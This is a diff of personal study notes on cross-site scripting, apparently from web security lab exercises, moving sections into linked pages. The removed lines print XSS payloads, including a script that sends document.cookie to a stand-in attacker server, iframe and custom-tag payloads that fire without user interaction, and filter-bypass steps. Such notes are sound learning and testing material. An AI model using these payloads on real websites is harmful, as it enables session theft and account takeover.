@@ -1,5 +1,11 @@
 # XSS
 
+[[XSS html tags]]
+[[bypass xss filters]]
+[[HTML attributes]]
+
+
+
 * instead of taking notes of all the payloads and all, add them to a automation and take
   note of the philosophy.
 
@@ -108,7 +114,7 @@ EXAMINE:
   * determine if it's reflected in the response
   * it should be short and only alphanumeric to survive input validations
 
-3. determine the reelection context (where is it reflected):
+1. determine the reflection context (where is it reflected):
   * between html tags
   * within a quoted tag attribute
   * a JavaScript string
@@ -117,6 +123,7 @@ EXAMINE:
 4. insert a payload:
   * send a combination of characters `abc ' " } < > ; // # - ()` to see how they are
     handled.
+  * try html tags
   * Take note of which ones the application escapes and which get rendered directly.
   * based on the context
   * to trigger JavaScript execution
@@ -126,42 +133,9 @@ EXAMINE:
 
 EX:
 
-[[Reflected XSS into HTML context with most tags and attributes blocked]]
+* [Reflected XSS into HTML context with most tags and attributes blocked](Reflected XSS into HTML context with most tags and attributes blocked.md)
+* [just custom tags allowed](Reflected XSS just custom tags allowed.md)
 
-test process:
-
-* see if you could add these to the examine part
-
-trying html tags and they get filtered:
-`<img src=1 onerror=print()>`
-
-`<>` aren't filtered.
-
-How to figure allowed tags? by bruteforcing, burp intruder is easy.
-if it's filtered, we get 400. 200 is a win.
-
-`<body>` isn't filtered.
-
-some attributes are filtered.
-
-bruteforcing attributes too.
-
-`GET /?search=<body%20$=1> HTTP/2`
-
-the `$` will be bruteforced.
-
-how to envoke the attack without user interaction:
-
-but we can't use `onload`. or can we?
-
-solution? run the page inside an `iframe`, on an attacker controlled page.
-we can resize the iframe on page load and the XSS will be executed automatically.
-
-it needs that the victim to visit the attacker controlled page.
-
-`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E "onload=this.style.width='100px'>`
-
-the iframe being resized as soon as it's loaded, triggering `onresize` events.
 
 ## DOM-based cross-site scripting:
 
@@ -212,85 +186,6 @@ EX:
 
 #### [[Stored DOM XSS]]
 
-# blocked
-
-* double quotes escaped:
-  * [[Reflected DOM XSS |adding a \ to escape the added \]]
-* angle brackets  and double quotes encoded
-  * [[XSS_examples#AngularJS expression with angle brackets and double quotes HTML-encoded|exploiting $eval.constructor]]
-
-# XSS html tags
-
-## `script`
-
-* inline script: embedded in the html
-* loaded from separate files `<script src="URL_OF_EXTERNAL_SCRIPT"></script>`
-
-EX:
-
-* if the attacker injects this code in victim's browser, unpon visiting, victim
-sends a GET request to the attacker's machine:
-
-```js
-<script>image = new Image();image.src='http://attacker_server_ip/?c='+document.cookie;</script>
-```
-
-* `<script>alert(document.domain)</script>`
-
-## `<img>`
-
-EX:
-
-* `<img onload=alert('the image has been loaded!') src="example.png">`
-* `<img src=1 onerror=alert(1)>`
-
-## `iframe`
-
-## `<select>``</select>`
-
-what to do with this? XSS between HTML tags
-
-When the XSS context is text between HTML tags, you need to add new HTML tags to
-trigger execution of JavaScript. e.g. `<img>`, `<script>`
-
-
-#### just custom tags allowed
-
-trying:
-
-`<script>
-<h1>`
-don't work.
-
-`<custom-tags>` works
-and we see it reflected in page's html.
-
-and then this gives us an alert:
-`<custom-tags onmouseover="alert()">`
-
-how to make it automatic (user doesn't have to do anything (mouseover))?
-
-`<custom-tags id="x" onfocus="alert(document.cookie)" tabindex="1">`
-
-`onfocus`: using tab or mouse click, e.g. you will see a cursor indicating
-you can type there.
-and might even be true on none inputting elements. if they have `tabindex="1"`
-
-`id="x"`: focus on a specific element (bookmarking, `hashchange`?).
-
-so at the end: if we append `#x` to the page that contains the payload, it will
-be focused on it and alerted:
-
-`/?search=<custom-tags id="x" onfocus="alert(document.cookie)" tabindex="1">#x`
-
-how to use js to redirect the victim's browser to the desired url?
-
-if the victim visits an attacker controlled domain, the attacker can run js on
-his browser, redirecting him to the URL.
-
-`<script>
-location="https://0a37005b03aa29a384e1193d0017008a.web-security-academy.net/?search=%3Ccustom-tags+id%3D%22x%22+onfocus%3D%22alert%28document.cookie%29%22+tabindex%3D%221%22%3E/#x"
-</script>`
 
 #### Reflected XSS with event handlers and href attributes blocked
 
@@ -741,13 +636,6 @@ monitoring the input:
 POC:
 `<script>alert('XSS by Vickie');</script>`
 
-
-# HTML attributes
-
-* `onload`
-* `onclick`
-* `onerrorr`
-
 # special URL schemes:
 
 `javascript:alert('XSS by Vickie)` like: `<iframe src=javascript:alert(1)>`
@@ -767,3 +655,5 @@ If you see a request to the path /xss, a blind XSS has been triggered!
     is in obs, and no idea on vimwiki
  2. each example in separate file (too messy, but works)
  3. in the same docuement: will be too long and slow.
+
+* use tags instead of making a file for everythig? instead of bypass filters, just add a tag #XSS_bypass_filter anywhere in the document, then when needed search for it.
